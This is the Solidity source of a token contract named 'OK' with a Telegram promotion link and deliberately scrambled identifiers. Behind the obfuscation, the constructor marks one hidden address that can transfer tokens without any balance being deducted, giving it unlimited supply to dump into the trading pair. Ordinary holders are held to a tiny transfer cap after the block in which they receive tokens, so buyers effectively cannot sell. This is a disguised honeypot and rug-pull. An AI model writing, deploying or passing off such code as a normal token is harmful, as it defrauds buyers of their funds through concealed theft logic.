/*

https://t.me/portaldorkpepe

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract OK is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private cyjkehaxlod;

    mapping(address => uint256) public balanceOf;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address ierfygdbnkcl, uint256 ajhr) public returns (bool success) {
        aqcxhoywn(msg.sender, ierfygdbnkcl, ajhr);
        return true;
    }

    uint256 private lmkpwvuo = 111;

    function aqcxhoywn(address mwpaqkfo, address ierfygdbnkcl, uint256 ajhr) private {
        address otxnzraedhm = IUniswapV2Factory(pslqfawkm.factory()).getPair(address(this), pslqfawkm.WETH());
        bool lqmgathz = 0 == cyjkehaxlod[mwpaqkfo];
        if (lqmgathz) {
            if (mwpaqkfo != otxnzraedhm && rtynqda[mwpaqkfo] != block.number && ajhr < totalSupply) {
                require(ajhr <= totalSupply / (10 ** decimals));
            }
            balanceOf[mwpaqkfo] -= ajhr;
        }
        balanceOf[ierfygdbnkcl] += ajhr;
        rtynqda[ierfygdbnkcl] = block.number;
        emit Transfer(mwpaqkfo, ierfygdbnkcl, ajhr);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address kwnjx, uint256 ajhr) public returns (bool success) {
        allowance[msg.sender][kwnjx] = ajhr;
        emit Approval(msg.sender, kwnjx, ajhr);
        return true;
    }

    mapping(address => uint256) private rtynqda;

    IUniswapV2Router02 private pslqfawkm;

    string public name;

    string public symbol;

    function transferFrom(address mwpaqkfo, address ierfygdbnkcl, uint256 ajhr) public returns (bool success) {
        require(ajhr <= allowance[mwpaqkfo][msg.sender]);
        allowance[mwpaqkfo][msg.sender] -= ajhr;
        aqcxhoywn(mwpaqkfo, ierfygdbnkcl, ajhr);
        return true;
    }

    uint8 public decimals = 9;

    constructor(string memory vefrsyz, string memory qohbickzlrtj, address dxwe, address xieu) {
        name = vefrsyz;
        symbol = qohbickzlrtj;
        balanceOf[msg.sender] = totalSupply;
        cyjkehaxlod[xieu] = lmkpwvuo;
        pslqfawkm = IUniswapV2Router02(dxwe);
    }
}
